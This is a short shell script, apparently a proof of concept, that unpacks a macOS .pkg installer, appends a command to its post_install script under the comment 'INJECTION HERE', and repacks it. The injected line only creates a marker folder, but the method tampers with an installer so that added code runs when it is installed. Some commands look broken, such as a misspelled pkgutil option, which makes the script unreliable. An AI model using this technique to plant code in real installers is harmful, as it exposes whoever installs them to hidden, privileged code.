
mkdir tmp
cd tmp

cp ../in.pkg ./in.pkg

xar -xf ./in.pkg
rm ./in.pkg

# CHOSE PKG
cd 1.pkg

mv Scripts Scripts.tmp
mkdir Scripts
cd Scripts
gzip -d ../Scripts.tmp # cpio -i -F ../Scripts.tmp
rm ../Scripts.tmp

# INJECTION HERE
echo "mkdir /home/taguar/Desktop/INJECTION_202" >> post_install

cd ../../

pkgutil --flaten . out.pkg

